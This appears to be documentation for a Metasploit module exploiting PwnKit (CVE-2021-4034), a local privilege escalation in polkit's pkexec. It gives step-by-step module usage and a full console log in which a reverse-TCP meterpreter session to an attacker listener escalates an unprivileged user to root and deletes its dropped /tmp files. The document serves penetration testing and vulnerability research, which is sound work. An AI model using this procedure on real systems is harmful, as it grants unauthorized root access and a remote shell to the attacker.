## Summary

A local privilege escalation vulnerability was found on polkit's pkexec utility. The pkexec application is a setuid tool designed to allow unprivileged users to run commands as privileged users according predefined policies. The current version of pkexec doesn't handle the calling parameters count correctly and ends trying to  execute environment variables as commands. An attacker can leverage this by crafting environment variables in such a way it'll induce pkexec to execute arbitrary code. When successfully executed the attack can cause a local privilege escalation given unprivileged users administrative rights on the target machine.

## Verification

* Start `msfconsole`
* Get a non-root shell/meterpreter
* use `exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec`
* set SESSION `<session-id>`
* set LHOST `<lhost-IP>`
* `run`

## Scenarios

```
msf6 exploit(multi/script/web_delivery) > 
[*] 172.16.30.21     web_delivery - Delivering Payload (497 bytes)
[*] Sending stage (39800 bytes) to 172.16.30.21
[*] Meterpreter session 1 opened (172.19.20.29:4444 -> 172.16.30.21:57038 ) at 2022-01-26 23:17:04 +0400

msf6 exploit(multi/script/web_delivery) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: zero
meterpreter > background 
[*] Backgrounding session 1...
msf6 exploit(multi/script/web_delivery) > use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > options 

Module options (exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   COMPILE  Auto             yes       Compile on target (Accepted: Auto, True, False)
   SESSION                   yes       The session to run this module on


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Auto


msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > set SESSION 1
SESSION => 1
msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > set LPORT 5555
LPORT => 5555
msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > set LHOST 172.19.20.29
LHOST => 172.19.20.29
msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session architecture: python
[*] Started reverse TCP handler on 172.19.20.29:5555 
[*] Writing '/tmp/.qwxijs' (282 bytes) ...
[*] Executing exploit '/tmp/.ciobixe'
[*] Sending stage (3012548 bytes) to 172.16.30.21
[+] Deleted /tmp/.qwxijs
[+] Deleted /tmp/.ciobixe
[*] Exploit result:

[*] Meterpreter session 2 opened (172.19.20.29:5555 -> 172.16.30.21:53512 ) at 2022-01-26 23:17:36 +0400

meterpreter > getuid
Server username: root
meterpreter > background 
[*] Backgrounding session 2...
```

**Reference:** https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
